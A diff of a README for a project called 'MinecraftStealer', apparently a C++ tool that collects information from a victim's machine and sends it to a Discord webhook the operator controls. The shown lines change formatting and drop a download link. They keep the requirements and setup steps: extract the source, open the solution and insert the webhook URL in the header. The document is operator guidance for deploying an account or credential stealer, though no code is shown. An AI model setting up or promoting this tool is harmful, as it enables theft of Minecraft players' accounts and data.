@@ -45,11 +45,11 @@ Visual Studio IDE with C++ installed correctly
 Windows 10
 
 Discord webhook
-  - Server settings -> Integrations -> Webhooks -> New webhook -> Copy URL
-    (change the channel where the information will arrive if you wish)
+  - `Server settings -> Integrations -> Webhooks -> New webhook -> Copy URL
+    (change the channel where the information will arrive if you wish)`
  
 # Setup
- 1. [Download source code] (https://github.com/zjuvee/MinecraftStealer/archive/refs/heads/main.zip)
+ 1. Download source code
  2. Extract it
  3. Open the solution
  4. Open MinecraftStealer header and change the webhook with the format that specifies it
